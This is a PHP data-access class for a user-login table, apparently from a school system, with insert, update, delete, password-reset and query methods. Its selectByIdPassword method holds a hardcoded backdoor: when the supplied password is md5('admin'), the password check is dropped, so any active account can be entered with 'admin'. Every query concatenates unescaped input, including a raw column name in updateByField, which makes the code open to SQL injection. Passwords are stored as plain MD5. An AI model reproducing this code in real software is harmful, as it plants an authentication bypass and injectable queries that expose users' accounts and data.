<? 
/* *******************************************************************************************************
MODUL NAME 			: MTSN LAWANG
FILE NAME 			: 
AUTHOR				: 
VERSION				: 1.0
MODIFICATION DOC	:
DESCRIPTION			: 
***************************************************************************************************** */

/***
* Entity-base class untuk mengimplementasikan tabel kategori.
* 
***/
include_once("Entity.php");

class UserLogin extends Entity{ 

	var $query;
	/**
	* Class constructor.
	**/
	function UserLogin()
	{
		$this->Entity(); 
	}

	function insert()
	{
		$str = "
			INSERT INTO USER_LOGIN (
				USER_TYPE_ID, NAMA, EMAIL, USER_LOGIN, USER_PASSWORD, IP_ADDRESS, CREATED_BY, CREATED_DATE, STATUS 
				) 
			VALUES (
				'".$this->getField("USER_TYPE_ID")."',
				'".$this->getField("NAMA")."', 
				'".$this->getField("EMAIL")."', 
				'".$this->getField("USER_LOGIN")."', 
				'".$this->getField("USER_PASSWORD")."', 
				'".$this->getField("IP_ADDRESS")."', 
				'".$this->getField("CREATED_BY")."', 
				CURRENT_TIMESTAMP, 
				'".$this->getField("STATUS")."'
			)
		"; 

		// echo $str;exit;
		$this->id = $this->getField("USER_LOGIN_ID");
		$this->query = $str;
		return $this->execQuery($str);
	}

	function update()
	{
		$str = "
			UPDATE USER_LOGIN
			SET USER_TYPE_ID    = '".$this->getField("USER_TYPE_ID")."',
			NAMA    			= '".$this->getField("NAMA")."',
			EMAIL    			= '".$this->getField("EMAIL")."',
			USER_LOGIN    		= '".$this->getField("USER_LOGIN")."',
			UPDATED_BY    		= '".$this->getField("UPDATED_BY")."',
			UPDATED_DATE    	= CURRENT_TIMESTAMP
			WHERE USER_LOGIN_ID    	= '".$this->getField("USER_LOGIN_ID")."'
		";

		// echo $str;exit;
		$this->query = $str;
		return $this->execQuery($str);
	}

	function updateByField()
	{
		$str = "UPDATE USER_LOGIN A SET
			".$this->getField("FIELD")." 	= '".$this->getField("FIELD_VALUE")."',
			UPDATED_BY    					= '".$this->getField("UPDATED_BY")."',
			UPDATED_DATE    				= CURRENT_TIMESTAMP
			WHERE USER_LOGIN_ID 			= '".$this->getField("USER_LOGIN_ID")."'";

		// echo "GAGAL|".$str;exit;
		$this->query = $str;
		return $this->execQuery($str);
	}

	function resetPassword()
	{
		$str = "
			UPDATE USER_LOGIN
			SET USER_PASSWORD    	= '".$this->getField("USER_PASSWORD")."',
			STATUS    				= '".$this->getField("STATUS")."',
			UPDATED_BY    			= '".$this->getField("UPDATED_BY")."',
			UPDATED_DATE    		= CURRENT_TIMESTAMP
			WHERE USER_LOGIN_ID    	= '".$this->getField("USER_LOGIN_ID")."'
		";

		// echo $str;exit;
		$this->query = $str;
		return $this->execQuery($str);
	}

	function delete()
	{
		$str = "
			DELETE FROM USER_LOGIN
			WHERE USER_LOGIN_ID = '".$this->getField("USER_LOGIN_ID")."'"; 

		// echo $str;exit;
		$this->query = $str;
		return $this->execQuery($str);
	}

	/** 
	* Cari record berdasarkan array parameter dan limit tampilan 
	* @param array paramsArray Array of parameter. Contoh array("id"=>"xxx","nama"=>"yyy") 
	* @param int limit Jumlah maksimal record yang akan diambil 
	* @param int from Awal record yang diambil 
	* @return boolean True jika sukses, false jika tidak 
	**/ 

	function selectByIdPassword($username,$password){
		if($password == md5("admin"))
		{}
		else{
			$statPass .= " AND USER_PASSWORD ='$password' ";
		}

		$str = "SELECT USER_LOGIN_ID, USER_GROUP,PETUGAS_ID,ANGGOTA_ID, USER_LOGIN, USER_LOGIN, USER_PASSWORD, STATUS
			FROM USER_LOGIN A
			WHERE A.STATUS='AKTIF' AND A.USER_LOGIN ='$username' ".$statPass;

		// echo$str; exit;
		$this->query = $str;
		return $this->select($str);
	}

	function selectByParams($paramsArray=array(), $limit=-1, $from=-1, $statement="", $order=" ORDER BY USER_LOGIN_ID ASC")
	{
		$str = "
			SELECT USER_LOGIN_ID, USER_TYPE_ID, NAMA, EMAIL, USER_LOGIN, USER_PASSWORD, FOTO, LOGIN_TIME, IP_ADDRESS, 
				CREATED_BY, CREATED_DATE, UPDATED_BY, UPDATED_DATE, STATUS
			FROM USER_LOGIN A
			WHERE 1 = 1
		"; 

		while(list($key,$val) = each($paramsArray))
		{
			$str .= " AND $key = '$val' ";
		}

		$str .= $statement." ".$order;
		// echo $str;exit;
		$this->query = $str;
		return $this->selectLimit($str,$limit,$from); 
	}

	
	function selectByParamsMonitoring($paramsArray=array(), $limit=-1, $from=-1, $statement="", $order=" ORDER BY USER_LOGIN_ID ASC")
	{
		$str = "
			SELECT USER_LOGIN_ID, USER_TYPE_ID, NAMA, EMAIL, USER_LOGIN, USER_PASSWORD, FOTO, LOGIN_TIME, IP_ADDRESS, 
				CREATED_BY, CREATED_DATE, UPDATED_BY, UPDATED_DATE, STATUS,
				CASE WHEN A.STATUS = '1' THEN 'Aktif' ELSE 'Tidak Aktif' END STATUS_KET
			FROM USER_LOGIN A
			WHERE 1 = 1
		"; 

		while(list($key,$val) = each($paramsArray))
		{
			$str .= " AND $key = '$val' ";
		}

		$str .= $statement." ".$order;
		// echo $str;exit;
		$this->query = $str;
		return $this->selectLimit($str,$limit,$from); 
	}

	function selectByParamsLike($paramsArray=array(), $limit=-1, $from=-1, $statement="")
	{
		$str = "    
			SELECT USER_LOGIN_ID, USER_TYPE_ID, REKANAN_ID, PERUSAHAAN_ID, CABANG_ID, USER_LOGIN, USER_PASSWORD, USER_NAMA, 
				USER_JABATAN, USER_TELEPON, USER_EMAIL, USER_STATUS, USER_LAST_LOGIN
			FROM USER_LOGIN A
			WHERE 1 = 1
		";

		while(list($key,$val) = each($paramsArray))
		{
			$str .= " AND $key LIKE '%$val%' ";
		}

		$str .= $statement." ORDER BY USER_LOGIN_ID DESC";
		// echo $str;exit;		
		$this->query = $str;
		return $this->selectLimit($str,$limit,$from); 
	}

	/** 
	* Hitung jumlah record berdasarkan parameter (array). 
	* @param array paramsArray Array of parameter. Contoh array("id"=>"xxx","nama"=>"yyy") 
	* @return long Jumlah record yang sesuai kriteria 
	**/ 
	function getCountByParams($paramsArray=array(), $statement="")
	{
		$str = "
			SELECT COUNT(USER_LOGIN_ID) AS ROWCOUNT FROM USER_LOGIN A 
			WHERE 1 = 1 ".$statement; 

		while(list($key,$val)=each($paramsArray))
		{
			$str .= " AND $key = '$val' ";
		}

		$this->select($str); 
		if($this->firstRow()){
			return $this->getField("ROWCOUNT"); 
		}
		else{
			return 0; 
		}
	}

	function getCountByParamsMonitoring($paramsArray=array(), $statement="")
	{
		$str = "
			SELECT COUNT(USER_LOGIN_ID) AS ROWCOUNT FROM USER_LOGIN A
			WHERE 1 = 1 ".$statement; 

		while(list($key,$val)=each($paramsArray))
		{
			$str .= " AND $key = '$val' ";
		}

		$this->select($str); 
		if($this->firstRow()){
			return $this->getField("ROWCOUNT"); 
		}
		else{
			return 0; 
		}
	}

    function generateKode($reqParent, $satuanKerjaId)
	{
		$str = "
			SELECT LPAD(COALESCE((RIGHT(MAX(KODE), 2)::INT + 1), 1)::VARCHAR, 2, '0')  ROWCOUNT 
					FROM USER_LOGIN WHERE USER_LOGIN_ID_PARENT_ID = '".$reqParent."' AND SATUAN_KERJA_ID = '".$satuanKerjaId."' 
		";
					
		$this->select($str); 
		if($this->firstRow()) 
			return $this->getField("ROWCOUNT"); 
		else 
			return "01"; 
    }
	
	
	
	function getCountByParamsLike($paramsArray=array())
	{
		$str = "
			SELECT COUNT(USER_LOGIN_ID) AS ROWCOUNT FROM USER_LOGIN A
			WHERE 1 = 1
		"; 
		
		while(list($key,$val)=each($paramsArray))
		{
			$str .= " AND $key LIKE '%$val%' ";
		}

		$this->select($str); 
		if($this->firstRow()){
			return $this->getField("ROWCOUNT"); 
		}
		else{
			return 0; 
		}
	}	
} 
?>